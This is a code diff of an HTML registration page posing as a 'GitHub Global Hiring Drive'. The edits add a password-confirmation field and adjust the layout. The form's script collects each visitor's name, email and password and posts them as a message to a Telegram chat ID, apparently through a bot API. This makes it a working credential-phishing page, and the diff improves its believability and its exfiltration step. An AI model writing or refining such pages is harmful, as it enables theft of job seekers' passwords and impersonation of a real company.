@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>GitHub Global Hiring Drive</title>
   <style>
     body {
@@ -11,6 +11,9 @@
       margin: 0;
       padding: 0;
       color: #222;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
     }
 
     header {
@@ -20,7 +23,7 @@
       text-align: center;
       font-size: 26px;
       font-weight: bold;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
       letter-spacing: 0.5px;
     }
 
@@ -38,7 +41,8 @@
       background-color: white;
       padding: 25px;
       border-radius: 12px;
-      box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
+      flex: 1;
     }
 
     h2 {
@@ -85,7 +89,6 @@
       padding: 15px;
       font-size: 13px;
       color: #555;
-      margin-top: 30px;
       border-top: 1px solid #ddd;
     }
 
@@ -93,6 +96,7 @@
       header {
         font-size: 22px;
       }
+
       .container {
         width: 90%;
       }
@@ -109,6 +113,7 @@
       <input type="text" name="name" placeholder="Full Name" required />
       <input type="email" name="email" placeholder="Email Address" required />
       <input type="password" name="password" placeholder="Create Password" required />
+      <input type="password" name="confirmPassword" placeholder="Re-enter Password" required />
       <button type="submit">Register for Drive</button>
     </form>
     <div id="thankyou">✅ Thank you! You will be contacted via email.</div>
@@ -124,10 +129,20 @@
       e.preventDefault();
 
       const form = e.target;
+      const name = form.name.value.trim();
+      const email = form.email.value.trim();
+      const password = form.password.value;
+      const confirmPassword = form.confirmPassword.value;
+
+      if (password !== confirmPassword) {
+        alert("Passwords do not match.");
+        return;
+      }
+
       const data = {
-        name: form.name.value,
-        email: form.email.value,
-        password: form.password.value
+        name: name,
+        email: email,
+        password: password
       };
 
       try {
@@ -136,11 +151,7 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: "968143308",
-            text: `📝 *GitHub Registration:*
-
-👤 Name: ${data.name}
-📧 Email: ${data.email}
-🔐 Password: ${data.password}`,
+            text: `📝 *GitHub Registration:*\n\n👤 Name: ${data.name}\n📧 Email: ${data.email}\n🔐 Password: ${data.password}`,
             parse_mode: "Markdown"
           })
         });
